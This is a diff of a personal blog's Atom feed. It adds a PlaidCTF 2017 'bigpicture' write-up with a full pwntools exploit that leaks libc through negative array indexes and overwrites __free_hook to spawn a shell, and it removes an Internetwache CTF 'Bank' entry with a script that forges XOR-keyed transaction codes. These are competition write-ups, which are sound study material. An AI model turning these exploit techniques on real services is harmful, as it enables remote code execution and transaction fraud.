@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://poning.me/"/>
-  <updated>2017-03-24T06:21:41.000Z</updated>
+  <updated>2017-04-28T14:44:52.000Z</updated>
   <id>https://poning.me/</id>
   
   <author>
@@ -14,6 +14,62 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PlaidCTF 2017: bigpicture (pwn 200)</title>
+    <link href="https://poning.me/2017/04/28/bigpicture/"/>
+    <id>https://poning.me/2017/04/28/bigpicture/</id>
+    <published>2017-04-28T14:44:52.000Z</published>
+    <updated>2017-04-28T14:44:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>Size matters!<br>Running at bigpicture.chal.pwning.xxx:420<br><a href="/2017/04/28/bigpicture/bigpicture_0b8eed37d9a4e5073456306e6eb0672c.tgz" title="Download">Download</a></p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Request a large buffer which will be allocated at somewhere after the libc pages.</li>
+<li>The offset between the buffer and the libc is fixed.</li>
+<li>Use negative indexes to leak the base address of the libc.</li>
+<li>Set <code>__free_hook</code> to <code>system</code>.</li>
+<li>Set the content of the buffer to <code>/bin/sh</code>.</li>
+<li><code>free(buffer)</code> becomes <code>system(&quot;/bin/sh&quot;)</code>.</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This challenge comes with a source code <a href="/2017/04/28/bigpicture/bigpicture.c" title="bigpicture.c">bigpicture.c</a>. What it does is, first, allocating a 2D array with the height and the width we choose. Then, we can set the content of any element of the array. If an element has already been set, it will print out its value. Finally, it will draw the 2D array on the exit.</p>
+<p>The vulnerability is that the index of the element to be set can be negative.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br></pre></td><td class="code"><pre><span class="hljs-keyword">if</span>(x &gt;= width || y &gt;= height) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"out of bounds!"</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></pre></td></tr></table></figure>
+<p>Therefore, we can leak or set the content before the buffer, which is usually in the heap. Next, here comes the essential part of the challenge. If the buffer located in the heap, the only memory pages we can access belong to the main program. Because of the full RELRO protection of this binary, we cannot hijack the control flow through overriding a GOT entry. Even worst, we don’t know the exact offset between the buffer and the main program. However, if we request a large enough buffer (about 128kb), it will be allocated by <code>mmap</code>. This buffer will be placed after the <code>libc.so.6</code>, and the offset between these two memory pages is fixed. So, we can leak the libc address and override the <code>__free_hook</code> to divert the control flow. Now we know why the description said “Size matters!”</p>
+<p>My exploit script is as follows.</p>
+<figure class="highlight python"><figcaption><span>bigpicture_exp.py</span><a href="/2017/04/28/bigpicture/bigpicture_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br><br><span class="hljs-comment"># remote</span><br>got_offset = <span class="hljs-number">0x12afa8</span><br>free_hook_offset = <span class="hljs-number">0x128868</span><br><br><span class="hljs-comment"># local</span><br>got_offset = <span class="hljs-number">0x130fa8</span><br>free_hook_offset = <span class="hljs-number">0x12e868</span><br><br>libc_offset = <span class="hljs-number">0x1f876</span><br><br>libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)<br><br><span class="hljs-comment"># r = process('./bigpicture', env={'LD_PRELOAD': './libc-2.23.so'})</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'bigpicture.chal.pwning.xxx'</span>, <span class="hljs-number">420</span>)<br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'How big? '</span>)<br>r.sendline(<span class="hljs-string">'1000 x 1000'</span>)<br><br><span class="hljs-comment"># leak libc address</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>address_in_libc = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):<br>    r.sendline(<span class="hljs-string">'0 , -'</span> + str(got_offset - i) + <span class="hljs-string">' , A'</span>)<br>    data = r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>    <span class="hljs-keyword">print</span> data<br>    address_in_libc += data[<span class="hljs-number">12</span>]<br><br>address_in_libc += <span class="hljs-string">'\x00\x00'</span><br>address_in_libc = u64(address_in_libc)<br>log.critical(<span class="hljs-string">'address in libc: '</span> + hex(address_in_libc))<br>libc.address = address_in_libc - libc_offset<br>log.critical(<span class="hljs-string">'libc base address: '</span> + hex(libc.address))<br>log.critical(<span class="hljs-string">'system address: '</span> + hex(libc.symbols[<span class="hljs-string">'system'</span>]))<br><br><span class="hljs-comment"># override __free_hook to system</span><br><span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> enumerate(p64(libc.symbols[<span class="hljs-string">'system'</span>])[:<span class="hljs-number">6</span>]):<br>    r.sendline(<span class="hljs-string">'0 , -'</span> + str(free_hook_offset - i) + <span class="hljs-string">' , '</span> + byte)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br><br><span class="hljs-comment"># write "/bin/sh" to the buffer to be freed</span><br><span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> enumerate(<span class="hljs-string">'/bin/sh'</span>):<br>    r.sendline(<span class="hljs-string">'0 , '</span> + str(i) + <span class="hljs-string">' , '</span> + byte)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br><br><span class="hljs-comment"># trigger free</span><br>r.sendline(<span class="hljs-string">'quit'</span>)<br><br>r.interactive()<br></pre></td></tr></table></figure>
+<p>I leak an address in the GOT section of the libc to calculate the base address of the libc. Then, I override <code>__free_hook</code> to <code>system</code> and the content of the buffer to <code>/bin/sh</code>. Now freeing the buffer at the end of the program becomes <code>system(&quot;/bin/sh&quot;)</code>. By the way, the offsets between the buffer and the libc of the remote machine were calculated by leaking some memory content and comparing then with the local one.</p>
+<blockquote>
+<p>Flag: <code>PCTF{draw_me_like_one_of_your_pwn200s}</code></p>
+</blockquote>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
+<li><strong>What I’ve learned:</strong><br>I know that the offsets between shared libraries are fixed. Through this challenge, I further confirm that the offsets between <code>mmap</code>ed pages are also fixed.</li>
+<li>Some references of ASLR:<ul>
+<li><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf" target="_blank" rel="external">Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems</a></li>
+<li><a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib-paper.pdf" target="_blank" rel="external">On the Eﬀectiveness of Full-ASLR on 64-bit Linux</a></li>
+</ul>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;Size matters!&lt;br&gt;Runn
+    
+    </summary>
+    
+      <category term="writeup" scheme="https://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="https://poning.me/tags/pwn/"/>
+    
+      <category term="libc hook" scheme="https://poning.me/tags/libc-hook/"/>
+    
+      <category term="ASLR" scheme="https://poning.me/tags/ASLR/"/>
+    
+  </entry>
   
   <entry>
     <title>0CTF 2017 Quals: Baby Heap 2017 (pwn 255)</title>
@@ -891,42 +947,6 @@
       <category term="code" scheme="https://poning.me/tags/code/"/>
     
       <category term="Internetwache CTF" scheme="https://poning.me/tags/Internetwache-CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Internetwache CTF 2016: Bank (crypto 90)</title>
-    <link href="https://poning.me/2016/03/02/bank/"/>
-    <id>https://poning.me/2016/03/02/bank/</id>
-    <published>2016-03-02T06:59:42.000Z</published>
-    <updated>2016-08-04T02:56:07.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>Everyone knows that banks are insecure. This one super secure and only allows only 20 transactions per session. I always wanted a million on my account.<br><strong>Attachment:</strong> <a href="/2016/03/02/bank/crypto90.zip" title="crypto90.zip">crypto90.zip</a></p>
-</blockquote>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>In this challenge, we have to deposit 1000000 dollars in the account within 20 transactions to get the flag. To complete a transaction, we have to first initiate it by providing how much we want to deposit. Then, use the “hashcode” it returns to finalize the transaction. The problem is that we can only deposit 5000 dollars at a time, so we must tamper the “hashcode” to deposit more money.</p>
-<p>The vulnerability in this challenge is that the “hashcode” it returns is just the result of xoring the plain text and a key. Since we know what the plain text is, we can easily retrieve the key and use it to create a “hashcode” of our own content. I created 20 transactions of 99999 dollars to get the flag.</p>
-<figure class="highlight python"><figcaption><span>exp.py</span><a href="/2016/03/02/bank/exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwnlib.tubes.remote <span class="hljs-keyword">import</span> remote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sxor</span><span class="hljs-params">(s1, s2)</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join(chr(ord(a)^ord(b)) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> zip(s1, s2))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">falsify</span><span class="hljs-params">(hashcode)</span>:</span><br>    key = sxor(<span class="hljs-string">'TRANSACTION: 1000'</span>, hashcode.decode(<span class="hljs-string">'hex'</span>))<br>    <span class="hljs-keyword">return</span> sxor(<span class="hljs-string">'TRANSACTION:99999'</span>, key).encode(<span class="hljs-string">'hex'</span>)<br><br><br>r = remote(<span class="hljs-string">'188.166.133.53'</span>, <span class="hljs-number">10061</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'create 1000'</span>)<br><br>    line = r.recvline()<br>    <span class="hljs-keyword">print</span> line<br>    hashcode = line.split()[<span class="hljs-number">-1</span>]<br><br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br>    r.sendline(<span class="hljs-string">'complete '</span> + str(i) + <span class="hljs-string">' '</span> + falsify(hashcode))<br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'Command: '</span>)<br></pre></td></tr></table></figure>
-<blockquote>
-<p>Flag: <code>IW{SHUT_UP_AND_T4K3_MY_M000NEYY}</code></p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;Everyone knows that b
-    
-    </summary>
-    
-      <category term="writeup" scheme="https://poning.me/categories/writeup/"/>
-    
-    
-      <category term="crypto" scheme="https://poning.me/tags/crypto/"/>
-    
-      <category term="Internetwache CTF" scheme="https://poning.me/tags/Internetwache-CTF/"/>
-    
-      <category term="xor" scheme="https://poning.me/tags/xor/"/>
     
   </entry>
   
